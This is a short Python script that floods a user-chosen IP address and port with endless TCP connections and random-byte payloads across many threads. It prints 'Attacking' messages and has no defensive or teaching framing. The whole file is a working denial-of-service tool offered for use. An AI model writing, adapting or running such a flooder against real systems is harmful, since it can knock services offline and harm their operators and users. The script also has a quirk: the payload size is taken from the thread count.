import random, socket, threading, os
ip = str(input('IP : '))
port = int(input('Port : '))
times = int(input('Packet : '))
threads = int(input('Thread : '))

def run():
    data = random._urandom(threads)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(data)
            for x in range(times):
                s.send(data)
            else:
                print('Attacking {} at Port {}'.format(ip, port))

        except socket.error:
            s.close()
            print('[VADIM MESSAGE] SERVER ERROR CONNECTION MAYBE SERVER ERROR')


if __name__ == '__main__':
    for y in range(threads):
        th = threading.Thread(target=run)
        th.start()
